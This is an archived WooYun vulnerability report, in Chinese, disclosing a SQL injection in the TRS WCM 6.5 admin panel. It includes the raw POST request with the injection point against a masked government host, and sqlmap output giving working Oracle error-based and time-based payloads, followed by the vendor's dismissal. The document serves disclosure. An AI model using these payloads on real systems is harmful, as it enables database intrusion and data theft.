@@ -1,0 +1,218 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		TRS WCM后台SQL注入一枚  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		TRS WCM后台SQL注入一枚  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/路人甲">路人甲</a> 
+</li><li>提交时间：		2014-04-22 15:07</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-04-22：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-04-23：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail"></p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">测试版本：WCM6.5，问题出在后台“新建栏目分发”<br />
+<br />
+<br />
+<br />
+直接看图：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/2214195034566e05add7a15f3271d98924265181.jpg" target="_blank"><img src="../images/2214195034566e05add7a15f3271d98924265181.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><pre><code>select WCMDocument.DocId from WCMCHNLDOC,WCMDocument where WCMDocument.DocId=WCMChnlDoc.DocId and WCMChnlDoc.CHNLID=? AND (注入点) AND ( WCMChnlDoc.DOCSTATUS&gt;0 and WCMChnlDoc.Modal&gt;0 and WCMChnlDoc.DocChannel&gt;0) order by WCMChnlDoc.DOCORDERPRI desc, WCMChnlDoc.DocOrder descParam#1:0</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code>POST http://马赛克.gov.cn/wcm/center.do HTTP/1.1<br />
+Host: 马赛克.gov.cn<br />
+Connection: keep-alive<br />
+Content-Length: 183<br />
+Origin: http://马赛克.gov.cn<br />
+X-Requested-With: XMLHttpRequest<br />
+User-Agent: 马赛克<br />
+Content-type: multipart/form-data<br />
+Accept: */*<br />
+DNT: 1<br />
+Referer: http://马赛克.gov.cn/wcm/app/channelsyn/docsyn_dis_add_edit.jsp?isChannel=true&amp;href=http%3A%2F%2F马赛克.gov.cn%2Fwcm%2Fapp%2Fchannelsyn%2Fchannelsyn_list.html%3FtabUrl%3D%252Fwcm%252Fapp%252Flogo%252Flogo_list.jsp%26tabType%3Dlogo%26ChannelId%3D4754%26SiteType%3D0%26IsVirtual%3D%26ChannelType%3D0%26RightValue%3D111111111111111111111111111111111111111111111111111111111111111%26&amp;OrderBy=&amp;RecordNum=0&amp;ObjectId=0&amp;ChannelId=4754&amp;_fromfp_=1<br />
+Accept-Encoding: gzip,deflate,sdch<br />
+Accept-Language: zh-CN,zh;q=0.8<br />
+Cookie: JSESSIONID=5154EE38E4E8CDBA76F8699F7A0D36CE; DOC_SOURCE_NAME=; LastVersion=10<br />
+<br />
+&lt;post-data&gt;&lt;method type=&quot;checkSQLValid&quot;&gt;wcm6_channel&lt;/method&gt;&lt;parameters&gt;&lt;CHANNELID&gt;&lt;![CDATA[4754]]&gt;&lt;/CHANNELID&gt;&lt;QUERYBY&gt;&lt;![CDATA[1=1) *注入点]]&gt;&lt;/QUERYBY&gt;&lt;/parameters&gt;&lt;/post-data&gt;</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><pre><code>root@kali:/tmp# sqlmap -r /tmp/test.txt --dbms=oracle --current-user --is-dba<br />
+<br />
+    sqlmap/1.0-dev - automatic SQL injection and database takeover tool<br />
+    http://sqlmap.org<br />
+<br />
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#039;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program<br />
+<br />
+[*] starting at 12:57:48<br />
+<br />
+[12:57:48] [INFO] parsing HTTP request from &#039;/tmp/test.txt&#039;<br />
+custom injection marking character (&#039;*&#039;) found in option &#039;--data&#039;. Do you want to process it? [Y/n/q] <br />
+[12:57:49] [INFO] testing connection to the target URL<br />
+[12:57:49] [WARNING] missing &#039;boundary parameter&#039; in &#039;Content-Type&#039; header. Will try to reconstruct<br />
+[12:57:49] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests<br />
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:<br />
+---<br />
+Place: (custom) POST<br />
+Parameter: #1*<br />
+    Type: error-based<br />
+    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)<br />
+    Payload: &lt;post-data&gt;&lt;method type=&quot;checkSQLValid&quot;&gt;wcm6_channel&lt;/method&gt;&lt;parameters&gt;&lt;CHANNELID&gt;&lt;![CDATA[4754]]&gt;&lt;/CHANNELID&gt;&lt;QUERYBY&gt;&lt;![CDATA[1=1)  AND 2628=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(117)||CHR(113)||CHR(115)||CHR(113)||(SELECT (CASE WHEN (2628=2628) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(102)||CHR(101)||CHR(108)||CHR(113)||CHR(62))) FROM DUAL)-- kwkr]]&gt;&lt;/QUERYBY&gt;&lt;/parameters&gt;&lt;/post-data&gt;<br />
+<br />
+    Type: AND/OR time-based blind<br />
+    Title: Oracle AND time-based blind<br />
+    Payload: &lt;post-data&gt;&lt;method type=&quot;checkSQLValid&quot;&gt;wcm6_channel&lt;/method&gt;&lt;parameters&gt;&lt;CHANNELID&gt;&lt;![CDATA[4754]]&gt;&lt;/CHANNELID&gt;&lt;QUERYBY&gt;&lt;![CDATA[1=1)  AND 1990=DBMS_PIPE.RECEIVE_MESSAGE(CHR(76)||CHR(72)||CHR(82)||CHR(86),5)-- TIhS]]&gt;&lt;/QUERYBY&gt;&lt;/parameters&gt;&lt;/post-data&gt;<br />
+---<br />
+[12:57:49] [INFO] the back-end DBMS is Oracle</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/路人甲" title="路人甲">路人甲</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-058052" title="TRS WCM后台SQL注入一枚">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2014-04-23 09:29</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢您的关注！<br />
+编辑SQL语句实现某些功能是系统的正常业务需要，且只有合法登录用户可用，软件中已对已知可造成实质性侵入和数据破坏的语法、特殊字符等做了过滤和限制，评估认定暂不需要修复，如有更多发现，欢迎反馈，我们会有专人跟进处理，再次感谢！<br />
+*** 安全无止境，我们一直在努力！***</p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="58052";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
